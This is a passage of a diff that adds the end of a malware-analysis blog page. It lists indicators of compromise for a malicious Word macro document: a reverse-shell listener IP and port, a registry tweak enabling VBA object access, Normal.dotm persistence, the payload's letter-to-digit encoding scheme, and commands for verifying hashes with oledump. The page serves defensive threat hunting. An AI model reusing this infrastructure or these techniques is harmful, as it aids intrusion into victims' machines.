+</span><span id="__span-3-17"><a id="__codelineno-3-17" name="__codelineno-3-17" href="#__codelineno-3-17"></a>51.38.87.253:25255     reverse-shell listener (hard-coded ASCII strings)
+</span><span id="__span-3-18"><a id="__codelineno-3-18" name="__codelineno-3-18" href="#__codelineno-3-18"></a>
+</span><span id="__span-3-19"><a id="__codelineno-3-19" name="__codelineno-3-19" href="#__codelineno-3-19"></a>Registry
+</span><span id="__span-3-20"><a id="__codelineno-3-20" name="__codelineno-3-20" href="#__codelineno-3-20"></a>--------
+</span><span id="__span-3-21"><a id="__codelineno-3-21" name="__codelineno-3-21" href="#__codelineno-3-21"></a>HKCU\SOFTWARE\Microsoft\Office\16.0\Word\Security\AccessVBOM = 1 (REG_DWORD)
+</span><span id="__span-3-22"><a id="__codelineno-3-22" name="__codelineno-3-22" href="#__codelineno-3-22"></a>
+</span><span id="__span-3-23"><a id="__codelineno-3-23" name="__codelineno-3-23" href="#__codelineno-3-23"></a>Filesystem
+</span><span id="__span-3-24"><a id="__codelineno-3-24" name="__codelineno-3-24" href="#__codelineno-3-24"></a>----------
+</span><span id="__span-3-25"><a id="__codelineno-3-25" name="__codelineno-3-25" href="#__codelineno-3-25"></a>C:\Users\&lt;user&gt;\AppData\Roaming\Microsoft\Templates\Normal.dotm   (persistence host)
+</span><span id="__span-3-26"><a id="__codelineno-3-26" name="__codelineno-3-26" href="#__codelineno-3-26"></a>
+</span><span id="__span-3-27"><a id="__codelineno-3-27" name="__codelineno-3-27" href="#__codelineno-3-27"></a>In-document artifacts (retro-hunt aids)
+</span><span id="__span-3-28"><a id="__codelineno-3-28" name="__codelineno-3-28" href="#__codelineno-3-28"></a>---------------------------------------
+</span><span id="__span-3-29"><a id="__codelineno-3-29" name="__codelineno-3-29" href="#__codelineno-3-29"></a>Last Modified By             : Kristina Rowell
+</span><span id="__span-3-30"><a id="__codelineno-3-30" name="__codelineno-3-30" href="#__codelineno-3-30"></a>VBA project name             : TemplateProject
+</span><span id="__span-3-31"><a id="__codelineno-3-31" name="__codelineno-3-31" href="#__codelineno-3-31"></a>VBA project GUID             : {C752F18D-1085-45D9-BD6E-440289ABFD0F}
+</span><span id="__span-3-32"><a id="__codelineno-3-32" name="__codelineno-3-32" href="#__codelineno-3-32"></a>VBA project DPB              : F8FA0BEC0CEC0CEC   (locked w/ empty password)
+</span><span id="__span-3-33"><a id="__codelineno-3-33" name="__codelineno-3-33" href="#__codelineno-3-33"></a>Document-protection password : 20exlnt20
+</span><span id="__span-3-34"><a id="__codelineno-3-34" name="__codelineno-3-34" href="#__codelineno-3-34"></a>Attached template name       : Arabic.dotm
+</span><span id="__span-3-35"><a id="__codelineno-3-35" name="__codelineno-3-35" href="#__codelineno-3-35"></a>AutoText entry name          : Doc
+</span><span id="__span-3-36"><a id="__codelineno-3-36" name="__codelineno-3-36" href="#__codelineno-3-36"></a>Decoder function name        : Putin
+</span><span id="__span-3-37"><a id="__codelineno-3-37" name="__codelineno-3-37" href="#__codelineno-3-37"></a>Self-wipe routine name       : DeleteVBAPROJECT
+</span><span id="__span-3-38"><a id="__codelineno-3-38" name="__codelineno-3-38" href="#__codelineno-3-38"></a>Payload-storage stream       : UserForm1/o  (TextBox1.Text property)
+</span><span id="__span-3-39"><a id="__codelineno-3-39" name="__codelineno-3-39" href="#__codelineno-3-39"></a>Encoded payload alphabet     : [a-j] only, length 16,392
+</span><span id="__span-3-40"><a id="__codelineno-3-40" name="__codelineno-3-40" href="#__codelineno-3-40"></a>Letter-to-digit mapping      : a-&gt;0  b-&gt;1  c-&gt;2  d-&gt;3  e-&gt;4
+</span><span id="__span-3-41"><a id="__codelineno-3-41" name="__codelineno-3-41" href="#__codelineno-3-41"></a>                               f-&gt;5  g-&gt;6  h-&gt;7  i-&gt;8  j-&gt;9
+</span><span id="__span-3-42"><a id="__codelineno-3-42" name="__codelineno-3-42" href="#__codelineno-3-42"></a>Encoding scheme              : after substitution, each 3-digit group = one ASCII codepoint
+</span><span id="__span-3-43"><a id="__codelineno-3-43" name="__codelineno-3-43" href="#__codelineno-3-43"></a>ZIP entry timestamps         : every entry pinned to 1980-01-01 00:00:00 (re-packaging artifact)
+</span><span id="__span-3-44"><a id="__codelineno-3-44" name="__codelineno-3-44" href="#__codelineno-3-44"></a>Metadata create/modify dates : 2022-02-06 12:21Z / 2022-02-09 14:30Z
+</span></code></pre></div>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="c1"># To verify the full indicator set on the sample:</span>
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>sha256sum<span class="w"> </span>/path/to/e6cc542b...d4f7d
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>sha1sum<span class="w">   </span>/path/to/e6cc542b...d4f7d
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>md5sum<span class="w">    </span>/path/to/e6cc542b...d4f7d
+</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>ssdeep<span class="w">    </span>/path/to/e6cc542b...d4f7d
+</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a>exiftool<span class="w">  </span>/path/to/e6cc542b...d4f7d
+</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a>oledump.py<span class="w"> </span>-s<span class="w"> </span><span class="m">1</span><span class="w"> </span>-a<span class="w"> </span>/path/to/word/vbaProject.bin<span class="w">   </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-E<span class="w"> </span><span class="s1">&#39;ID=|Name=|DPB=&#39;</span>
+</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a>sha256sum<span class="w"> </span>/tmp/stage2_decoded.vba<span class="w">                 </span><span class="c1"># the decoded stage-2 hash</span>
+</span></code></pre></div>
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+  
+
+
+
+      
+    </article>
+  </div>
+
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+<footer class="site-footer-custom">
+  <div class="site-footer-inner">
+    <span class="footer-note">v0lundr.github.io · TLP:WHITE</span>
+    <div class="footer-links">
+      <a href="https://github.com/V0lundr" target="_blank" rel="noopener">GitHub</a>
+      <a href="/feed_rss_created.xml" target="_blank" rel="noopener">RSS</a>
+    </div>
+  </div>
+</footer>
+
+<style>
+  /* Hide default Material footer */
+  .md-footer { display: none !important; }
+
+  .site-footer-custom {
+    border-top: 1px solid #1e2535;
+    background: #07090f;
+    padding: 1.5rem 0;
+  }
+
+  .site-footer-inner {
+    max-width: 1200px;
+    margin: 0 auto;
+    padding: 0 2rem;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    flex-wrap: wrap;
+    gap: 1rem;
+  }
+
+  .footer-note {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.65rem;
+    color: #5a6478;
+    letter-spacing: 0.06em;
+  }
+
+  .footer-links {
+    display: flex;
+    gap: 1.5rem;
+  }
+
+  .footer-links a {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.65rem;
+    letter-spacing: 0.08em;
+    text-transform: uppercase;
+    color: #5a6478;
+    text-decoration: none;
+    transition: color 0.15s;
+  }
+
+  .footer-links a:hover { color: #e8a84c; }
+</style>
+
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.tabs", "navigation.top", "navigation.footer", "search.suggest", "search.highlight", "content.code.copy", "content.code.annotate", "content.tooltips"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+        <script src="../../javascripts/fix.js"></script>
+      
+    
+  </body>
+</html>
